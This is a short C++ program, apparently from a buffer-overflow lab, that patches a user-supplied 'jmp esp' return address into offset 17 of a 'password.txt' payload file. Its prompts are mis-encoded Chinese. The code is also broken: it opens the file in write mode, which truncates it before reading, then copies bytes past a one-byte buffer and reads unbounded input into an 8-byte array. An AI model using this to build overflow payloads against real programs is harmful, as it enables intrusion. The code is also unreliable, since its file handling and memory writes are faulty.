#include <Windows.h>
#include <stdio.h>

int main()
{
    FILE* fp;
    fp = fopen("password.txt", "wb");

    fseek(fp, 0, SEEK_END);
    int len = ftell(fp);
    char* buf = new char[len + 1];
    rewind(fp); // �ƶ��ļ�ָ�뵽��ͷ
    fread(buf, 1, len, fp);
    buf[len] = 0;


    char input[8] = { 0 };
    printf("������jmp esp�ĵ�ַ->:\n");
    scanf("%s", input);

  
    memcpy(buf + 17, input, 8);
    fwrite(buf, 1, len, fp);
    fclose(fp);
	return 0;
}